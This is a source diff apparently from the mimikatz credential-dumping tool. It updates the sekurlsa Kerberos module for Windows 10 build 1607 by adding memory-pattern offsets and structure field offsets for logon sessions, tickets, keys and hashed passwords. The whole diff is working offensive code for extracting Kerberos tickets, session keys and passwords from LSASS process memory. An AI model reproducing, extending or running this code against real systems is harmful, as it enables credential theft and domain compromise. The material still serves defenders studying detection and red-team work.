@@ -15,6 +15,7 @@ KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 4}},
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
 	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 6}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 7}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_KerbReferenceLogonSession[]	= {0x8B, 0x7D, 0x08, 0x8B, 0x17, 0x39, 0x50};
@@ -29,7 +30,7 @@ KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,4}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,4}},
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,5}},
-	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,6}},
+	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
 };
 #endif
 
@@ -282,6 +283,41 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData)
 	},
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials),
+		{
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_1),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_2),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, Tickets_3),
+		},
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ServiceName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, DomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Description),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, AltTargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ClientName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketFlags),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, KeyType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Key),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, StartTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, EndTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, RenewUntil),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketEncType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Ticket),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketKvno),
+		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_10_1607),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
+		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6_1607, generic),
+		sizeof(KERB_HASHPASSWORD_6_1607),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData)
+	},
 };
 
 KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
@@ -326,7 +362,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SE
 	PBYTE infosCsp;
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {*(PVOID *) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetSmartCard), pData->cLsass->hLsassMem};
 
-	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData, (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10);
+	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) LocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData, (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : (pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607) ? KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607);
 	if(aLsassMemory.address)
 	{
 		if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
